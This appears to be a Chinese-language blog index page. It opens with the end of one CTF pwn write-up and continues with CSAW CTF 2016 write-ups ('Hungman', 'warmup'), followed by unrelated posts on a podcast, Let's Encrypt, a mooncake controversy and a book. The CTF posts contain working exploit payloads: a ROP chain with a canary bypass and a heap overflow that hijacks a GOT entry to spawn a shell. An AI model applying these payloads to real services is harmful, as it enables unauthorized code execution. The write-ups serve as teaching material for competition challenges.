<li>選項 2 會接收長達 460 bytes 的輸入，並從輸入 buffer 開始輸出 324bytes。透過 IDA 得知該 buffer 的起點位在  <code>rbp-320</code> ，所以這裡可以 leak 出位於 <code>rbp-8</code> 的 canary。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">write(socket_num, <span class="string">&quot;Time to test your exploit...\n&quot;</span>, <span class="number">0x1D</span>uLL);</span><br><span class="line">write(socket_num, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">read(socket_num, &amp;s, <span class="number">460uLL</span>);</span><br><span class="line">write(socket_num, &amp;s, <span class="number">324uLL</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>選項 3 離開程式。</li>
</ul>
<hr>
<p>有了 libc address 和 canary 後就可以開始蓋 ROP chain 了。原本想直接蓋 <code>system</code> 開 shell，不知道為什麼失敗了，問了才知道由於前面的 <code>fork</code>，這邊直接叫 <code>system</code> 的話 file descriptor 會接不起來。所以我們要先用 <code>dup2()</code> 把 fd 設好才行。<br>由於前面呼叫 <code>read</code>  時已經把 rdi 設成我們要的值了，所以用 <code>dup2</code> 之前只要再把 rsi 設好即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chain = <span class="string">&#x27;A&#x27;</span>*<span class="number">312</span> + p64(canary) + <span class="string">&#x27;B&#x27;</span>*<span class="number">8</span> +</span><br><span class="line">	  p64(pop_rsi_r15_ret) + p64(<span class="number">0x0</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(dup2) +</span><br><span class="line">	  p64(pop_rsi_r15_ret) + p64(<span class="number">0x1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(dup2) +</span><br><span class="line">	  p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br></pre></td></tr></table></figure>

<p>把一開始 <code>accept</code> 的回傳值送給 <code>stdin</code> 和 <code>stdout</code> 之後 call <code>system</code> 就可以拿到 shell 了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM&#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/20/2016/2016-09-20-caipai-fm/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/20/2016/2016-09-20-caipai-fm/" itemprop="url">我录了一档叫「彩排」的播客</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-20T00:00:00+08:00">
                2016-09-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <p>一个人住有一年时间了，也养成了听播客的习惯，我最喜欢的是 IPN 一档叫「太医来了」的播客，同时我也听过「内核恐慌」和「 Teahour 」这样的技术类播客，听久了也有自己录一档播客的冲动。</p>
<p>终于经过了很多的准备工作之后，我把这个想法付诸实践了，播客的名字叫「彩排」，你可以在 iTunes 直接搜索，也可以访问 <a target="_blank" rel="noopener" href="https://caipai.fm/">caipai.fm</a> 在线收听和下载。如果有任何的建议意见，可以发邮件到 <a href="mailto:&#102;&#x65;&#101;&#x64;&#98;&#97;&#99;&#107;&#x40;&#99;&#x61;&#x69;&#112;&#x61;&#105;&#46;&#102;&#109;">&#102;&#x65;&#101;&#x64;&#98;&#97;&#99;&#107;&#x40;&#99;&#x61;&#x69;&#112;&#x61;&#105;&#46;&#102;&#109;</a>。</p>
<p>前三期的主题分别是「自由软件和许可证」、「番茄工作法」、「密码和互联网安全」，我本不想把它限制为一个技术类播客，但我所了解并且可以分享给大家的恐怕大部分都是技术方面的话题了。接下来的选题可能会包括： Email 、 JavaScript 、比特币、养猫等。</p>
<p>因为我本来不善言辞，也没有音频录制和剪辑的经验，最后效果其实不是很理想，还不能与开头提到的几档播客相提并论。但在这前三期的制作中，我的水平也在一点点提高，期待将来能越做越好吧。此外我感觉一个人讲会让听众有一种「压力」，可能还是两个人以对话的方式录效果会更好，如果你希望参与进来也欢迎和我联系。</p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/19/CSAW-CTF-16-Hungman-300/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/19/CSAW-CTF-16-Hungman-300/" itemprop="url">[CSAW CTF 2016] Hungman 300</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-19T23:33:00+08:00">
                2016-09-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn		<br>Point: 300	<br>Solver: nae @ BambooFox	<br>第一次貢獻大分數給 BambooFox，雖然這次比賽比較簡單，但還是很感動QQ</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>64 bit ELF, NX, Partial RELRO, Stack Canary, no PIE</p>
<p>程式一開始會要求輸入名字，而他會 <code>malloc</code> 名字長度的記憶體來存放使用者輸入的名字，接著會 <code>malloc</code> 一塊 0x80 大小的 heap，以下稱之為 <code>key_heap</code>，第一格<strong>高位</strong> 4 bytes 會存放 length of name，第二格則儲存著 name’s heap 的位址。</p>
<p>name’s heap &amp; key_heap 的 memory layout 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">low     -&gt;     high</span><br><span class="line">+ ------------- +  name<span class="string">&#x27;s heap chunk head</span></span><br><span class="line"><span class="string">| previous size |</span></span><br><span class="line"><span class="string">| ------------- |</span></span><br><span class="line"><span class="string">|      size     |</span></span><br><span class="line"><span class="string">| ------------- |</span></span><br><span class="line"><span class="string">|      name     |  32 bytes</span></span><br><span class="line"><span class="string">|               |		|</span></span><br><span class="line"><span class="string">|               |		|</span></span><br><span class="line"><span class="string">|               |		v</span></span><br><span class="line"><span class="string">+ ------------- +  key_heap chunk head</span></span><br><span class="line"><span class="string">| previous size |</span></span><br><span class="line"><span class="string">| ------------- |</span></span><br><span class="line"><span class="string">|      size     |</span></span><br><span class="line"><span class="string">| ------------- |</span></span><br><span class="line"><span class="string">|       |length |</span></span><br><span class="line"><span class="string">| ------------- |</span></span><br><span class="line"><span class="string">|  name&#x27;</span>s heap  |</span><br><span class="line">+ ------------- +</span><br></pre></td></tr></table></figure>
<p>輸入完名字之後，回到了 <code>main</code>，接著便進入玩遊戲的 function 以下稱為 game。</p>
<p>遊戲是猜小寫英文字母，然後如果分數超過 64 分可以重新改名字，而改寫名字時可以在 heap 上進行 overflow。</p>
<p>因為是猜小寫字母，而照他的規則一開始輸入名字的長度<br>決定可以猜的次數，因此一開始輸入名字時就給他來個 <code>&#39;A&#39;*26</code>，這樣基本上從 a 猜到 z 猜到一半就能夠破分數紀錄而改寫名字。</p>
<p>改寫名字的 code 重點如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">malloc</span>(<span class="number">248</span>);</span><br><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">248</span>);</span><br><span class="line">len_of_new_name = read(<span class="number">0</span>, s, <span class="number">248</span>);</span><br><span class="line">*(_DWORD*)(a1 + <span class="number">4</span>) = len_of_new_name; <span class="comment">// 把剛剛 key_heap 存 name size 的地方改成 new name 的 size</span></span><br><span class="line"><span class="built_in">memcpy</span>(*(<span class="type">void</span>**)(a1 + <span class="number">8</span>), s, len_of_new_name);</span><br><span class="line"><span class="built_in">free</span>(s);</span><br></pre></td></tr></table></figure>
<p>由上面的 code 可以發現，他最長可以讀 248 bytes，而我們一開始輸入的名字長度只有 26，因此 new name 可以好好的構造來 <strong>leak information</strong>。</p>
<p>因為離開 game 後會把新名字 dump 出來，而程式找 <code>name_heap</code> 的方式是靠 <code>key_heap</code> 的第二格來找，因此在剛剛的 overflow 時我們將原本儲存著 name’s heap address 的那格改成 GOT entry，這樣一來，在 dump new name 的時候便可以 <strong>leak libc information</strong> 接著利用主辦方給的 libc 就可以找到 <code>libc base</code>。</p>
<p>這邊 overflow 的 payload 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">32</span> <span class="comment"># padding</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># previous size</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>) <span class="comment"># size</span></span><br><span class="line">payload += p32(<span class="number">0x20</span>) <span class="comment"># score</span></span><br><span class="line">payload += p32(<span class="number">0x1b</span>) <span class="comment"># len_of_new_name</span></span><br><span class="line">payload += p64(libc_start_main) <span class="comment"># __libc_start_main GOT entry</span></span><br></pre></td></tr></table></figure>

<p>size 那邊沒必要寫壞就寫回原來的值，下一格的<strong>低位</strong> 4 bytes 會是 這次刷新的分數(下面提供相關 code)，為了加速下次玩遊戲時間，把分數改低一點，然後因為猜個 26 次就很夠了所以<strong>高位</strong> 4 bytes 寫回原來的長度就好了，接下來再玩一次。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">score = *(_DWARD*)a1;</span><br></pre></td></tr></table></figure>

<p>第二次改名時就不會改到 name’s heap，會改到剛剛 overwrite 的 <code>__libc_start_main</code> GOT entry 上。</p>
<p>GOT table 的 libc function order:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main@got.plt</span><br><span class="line">__gmon_start__@got.plt</span><br><span class="line">memcpy@got.plt</span><br><span class="line">malloc@got.plt</span><br><span class="line">setvbuf@got.plt</span><br></pre></td></tr></table></figure>
<p>因為在改名字時有一段 code 是 <code>memcpy(*(void**)(a1+8), s, len_of_new_name)</code>，所以把 <code>memcpy</code> 的 GOT hijack 掉改成 <code>system</code>，要注意的點是改名字時會用到 <code>malloc</code> 而 <code>read</code> 會在結尾補 <code>\x00</code> 所以乾脆直接連 <code>malloc</code> 也一起蓋正確的 <code>libc address</code> 確保他不會壞，而 <code>malloc</code> 的下一個 function 後面用不到就不用管他。這邊 payload 開頭我就先送 <code>&#39;sh\x00&#39;</code> 上去這樣 <code>memcpy</code> 的一開始就可以直接 <code>system(&#39;sh&#39;)</code>。</p>
<p>第二次的 payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;sh\x00&quot;</span>.ljust(<span class="number">8</span>)</span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(malloc)</span><br></pre></td></tr></table></figure>

<p>之後再玩一次遊戲，然後改名字的時候隨便輸入就可以拿到 shell。</p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/19/CSAW-CTF-2016-warmup-50/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/19/CSAW-CTF-2016-warmup-50/" itemprop="url">[CSAW CTF 2016] warmup 50</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-19T23:31:00+08:00">
                2016-09-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <blockquote>
<p>Category: pwn		<br>Point: 50		<br>Solver: nae @ BambooFox	</p>
</blockquote>
<p>和藹可親的 warmup</p>
<p>64 bit ELF NX, Partial RELRO, no canary, no PIE</p>
<p>這題就簡單的 <code>stack overflow</code> 量一下 offset，他有一個 function 會直接 <code>system(&#39;cat flag.txt&#39;)</code>，在 ret address 的地方蓋成那個 function 就可以拿 flag。</p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/19/2016/use-certbot-to-issue-lets-encrypt-certificates/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/19/2016/use-certbot-to-issue-lets-encrypt-certificates/" itemprop="url">使用 Certbot 自动签发 Let's Encrypt 证书</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-19T22:59:17+08:00">
                2016-09-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>今晚一回来就看到 Google Search Console 给我发了封邮件说我站点上的 SSL 证书过期了。我上去一看还真是，这张我从 Andy 手里买来的通配符证书已经在昨天失效了。</p>
<p>唉，时间也是过得忒快啊，转眼间一年就过去了，我也成为了苦逼的高三党，真是惨得不行 ( ・_ゝ・)</p>
<p>不过正好，我从 <a target="_blank" rel="noopener" href="https://prinzeugen.net/lets-encrypt-now-we-are-trusted/">之前就一直在关注</a> Let’s Encrypt 这个项目了，这次正好试试看它好不好用。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/09/19/2016/use-certbot-to-issue-lets-encrypt-certificates/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/17/2016/2016-09-17-alibaba-yuebing/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/17/2016/2016-09-17-alibaba-yuebing/" itemprop="url">我看「刷月饼」事件</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-17T00:00:00+08:00">
                2016-09-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <blockquote>
<p>前因后果见 <a target="_blank" rel="noopener" href="https://www.zhihu.com/topic/20060618/hot">知乎：阿里月饼事件</a>；关于本文的讨论见 <a target="_blank" rel="noopener" href="https://www.v2ex.com/t/306691">V2EX: 关于刷月饼事件我来唱点反调</a></p>
</blockquote>
<p>可能发得有点晚了，是因为我不是有感于事件本身，而是看了大家的讨论一边倒地黑阿里，以至于有一些逻辑显得不是那么合理，所以我想 <strong>仅就几个细节问题</strong> 谈一谈我的想法。</p>
<h3 id="这是不是一个价值观问题"><a href="#这是不是一个价值观问题" class="headerlink" title="这是不是一个价值观问题"></a>这是不是一个价值观问题</h3><p>我觉得这是一个价值观问题，就好像就是有人觉得「刷月饼」不妥甚至很严重，也有人认为没什么大不了。所谓价值观就是指你如何看待一件事情的对错、如何进行选择，很难说谁对谁错，但这两种人的价值观的确是不同的。公司因为价值观不同开除一个员工其实也没什么不对，对双方都有好处，如果被开除的人不觉得是自己的错，那么也很难说是对他的伤害。</p>
<h3 id="下单但没有购买算不算得到了「利益」"><a href="#下单但没有购买算不算得到了「利益」" class="headerlink" title="下单但没有购买算不算得到了「利益」"></a>下单但没有购买算不算得到了「利益」</h3><p>既然下单是需要抢的，说明这个订单很可能对应着一份库存，你下单成功了意味着你得到了这样一份权利 —— 你可以在未来的一个小时里决定要不要买这个月饼，你甚至可以等有人出了一个合适的价格之后转卖这个月饼，可以说这种购买的权利就是「抢月饼」的核心利益，所以订单最后是否成交不影响刷月饼获利的这个事实。</p>
<h3 id="信息安全相关职位刷月饼是否可以减轻责任"><a href="#信息安全相关职位刷月饼是否可以减轻责任" class="headerlink" title="信息安全相关职位刷月饼是否可以减轻责任"></a>信息安全相关职位刷月饼是否可以减轻责任</h3><p>的确可能这个职位的工作之一就是去发现漏洞，但这也是在有工作安排的情况下，而且发现漏洞（活动规则设计不合理可以认为是广义的漏洞）后也不应该去利用它为自己谋利（是否算谋利已在前一小节讨论）。所谓 Geek 精神不应该被当作一个挡箭牌，在一个大的群体里还是要去遵守普适的规则，刷月饼就好像钻公司规章中的空子。<strong>打一个比方的话就好像办公室桌上有十几块月饼给大家吃，并没有限制一个人可以拿几块，但你一个人就拿了一大半，这显然不妥。</strong></p>
<h3 id="抢月饼网站设计不合理开发者是否有责任"><a href="#抢月饼网站设计不合理开发者是否有责任" class="headerlink" title="抢月饼网站设计不合理开发者是否有责任"></a>抢月饼网站设计不合理开发者是否有责任</h3><p>我觉得这本来就是一个内部的活动，要考虑一个投入产出的性价比，不可能做到和对外的服务一样稳定和周全，在公司内部大家是有一个基本的信任的。因为往往一个公司的同事之间有着共同的利益和相近的价值观，没必要将方方面面都限制死，相信如果为抢月饼设计一个事无巨细、毫无漏洞的规则也不是大家希望看到的。</p>
<h3 id="抢火车票和抢月饼是否是一回事"><a href="#抢火车票和抢月饼是否是一回事" class="headerlink" title="抢火车票和抢月饼是否是一回事"></a>抢火车票和抢月饼是否是一回事</h3><p>和前一点有点像，对外和对内是有分别的，从抢火车票这一点来说，你对其他买不到火车票的人是不负有任何的责任的，只要你不违反法律和协议你可以做任何事情；但在公司内则不同，大家需要有基本信任，即使没有明文的规则写明，当然你也可以不遵守这种「潜规则」，后果大概就是因为价值观不符被开除了，只要补偿给到位，开除当然也是合法的。</p>
<h2 id="写在后"><a href="#写在后" class="headerlink" title="写在后"></a>写在后</h2><p>说实话，当我说出这些想法之后我有点怀疑人生，有点怀疑当我的意见和别人不同的时候我是否应该说出来，因为有的时候说出来会招致一些攻击，也会被一些本来是朋友的人划为异类。每当我看到这种一边倒的舆论的时候，我总会有点警惕，因为一边倒意味着既然大家的目标是一样的，即使过程有一些小差错也无所谓，当你指出这些问题的时候，就会有人说你在洗地。没错，腾讯抄袭的时候我给腾讯洗、百度搞竞价排名的时候我给百度洗。</p>
<p>回到讨论本身，我简单补充几点：</p>
<ul>
<li>如果有公司真的会因为「价值观」而开除一名员工，我觉得是值得尊敬的，因为这家公司会在意在一起工作的同事是什么样的人，只有这样才能构建出一种凝聚力。当然，这在大公司是很难做到一碗水端平的，也很难说这是否是阿里开除几名员工的真正原因。</li>
<li>很多人比较在意最后两点中的「双重标准」，我觉得这是一个很正常的事情，对家人、对同事，和对陌生人我们是有不同的要求和期待的，在公司抢月饼要比在陌生人间抢火车票有更多的道德约束我觉得也是合理的。</li>
</ul>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/16/2016-09-16-what-is-love/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/16/2016-09-16-what-is-love/" itemprop="url">什么是爱 - 读《少有人走的路》</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-16T23:04:36+08:00">
                2016-09-16
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/summary/" itemprop="url" rel="index">
                    <span itemprop="name">summary</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <img src="/images/the-road-less-traveled-book.jpg" class="">

<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>爱是什么？这或许是一个永恒的话题。我很少从学校的传统教育以及家庭教育中获得这方面的知识。</p>
